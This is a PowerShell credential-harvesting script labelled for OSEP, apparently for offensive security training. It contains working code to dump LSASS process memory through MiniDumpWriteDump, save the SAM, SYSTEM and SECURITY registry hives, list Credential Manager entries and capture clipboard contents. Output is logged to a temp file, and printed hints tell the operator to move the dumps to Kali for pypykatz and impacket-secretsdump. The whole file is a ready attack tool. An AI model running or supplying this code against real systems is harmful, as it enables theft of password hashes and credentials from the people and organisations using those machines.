# OSEP - Credential Harvesting
# . .\cred_harvest.ps1
# Invoke-CredHarvest            ← runs all methods
# Invoke-CredHarvest -method lsass|sam|vault|clipboard

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][Creds][$l] $m" -EA SilentlyContinue}catch{}}

# ── MiniDump LSASS to disk (requires SYSTEM or SeDebugPrivilege) ──────────
function Dump-LSASS {
    $out = "C:\Windows\Temp\ls.dmp"
    wl "Dumping LSASS → $out"

    try {
        Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices; using System.IO;
public class Dumper {
    [DllImport("dbghelp", SetLastError=true)] public static extern bool MiniDumpWriteDump(
        IntPtr hProc, uint procId, SafeHandle file, uint dumpType,
        IntPtr excParam, IntPtr userParam, IntPtr callParam);
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint acc, bool inh, int pid);
}
"@ -EA Stop

        $lsass = Get-Process lsass -EA Stop
        $h     = [Dumper]::OpenProcess(0x1F0FFF, $false, $lsass.Id)
        $fs    = [IO.File]::Open($out, [IO.FileMode]::Create)
        $ok    = [Dumper]::MiniDumpWriteDump($h, $lsass.Id, $fs.SafeFileHandle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
        $fs.Close()

        if ($ok) {
            wl "LSASS dump written: $out"
            Write-Host "[+] LSASS dump: $out  — transfer to Kali and run: pypykatz lsa minidump $out"
        } else {
            wl "MiniDumpWriteDump returned false" "ERROR"
            Write-Host "[-] MiniDump failed"
        }
    } catch {
        wl "LSASS dump exception: $_" "ERROR"
        Write-Host "[-] LSASS dump error: $_"
    }
}

# ── SAM / SYSTEM registry hive dump (offline cred extraction) ─────────────
function Dump-SAM {
    wl "Dumping SAM+SYSTEM hives"
    Write-Host "[*] Saving SAM and SYSTEM hives..."

    $cmds = @(
        "reg save HKLM\SAM   C:\Windows\Temp\sam.hiv /y",
        "reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv /y",
        "reg save HKLM\SECURITY C:\Windows\Temp\sec.hiv /y"
    )
    foreach ($c in $cmds) {
        $out = cmd /c $c 2>&1
        wl "$c → $out"
        Write-Host "  $out"
    }
    Write-Host "[+] Transfer to Kali: impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL"
}

# ── Windows Credential Manager vault dump ────────────────────────────────
function Dump-Vault {
    wl "Enumerating Credential Manager"
    Write-Host "[*] Credential Manager entries:"

    try {
        $creds = cmdkey /list 2>&1
        wl "cmdkey output: $creds"
        Write-Host $creds
    } catch {
        wl "Vault enum failed: $_" "ERROR"
    }
}

# ── Clipboard (sometimes catches passwords typed or pasted) ───────────────
function Get-Clipboard-Creds {
    wl "Reading clipboard"
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clip = [Windows.Forms.Clipboard]::GetText()
        if ($clip) {
            wl "Clipboard: $clip"
            Write-Host "[*] Clipboard: $clip"
        } else {
            Write-Host "[*] Clipboard empty"
        }
    } catch {
        wl "Clipboard read failed: $_" "WARN"
    }
}

# ── Master runner ─────────────────────────────────────────────────────────
function Invoke-CredHarvest {
    param(
        [ValidateSet('lsass','sam','vault','clipboard','all')]
        [string]$method = 'all'
    )

    wl "=== CredHarvest started. Method=$method ==="

    switch ($method) {
        'lsass'     { Dump-LSASS }
        'sam'       { Dump-SAM }
        'vault'     { Dump-Vault }
        'clipboard' { Get-Clipboard-Creds }
        'all'       { Dump-LSASS; Dump-SAM; Dump-Vault; Get-Clipboard-Creds }
    }
}
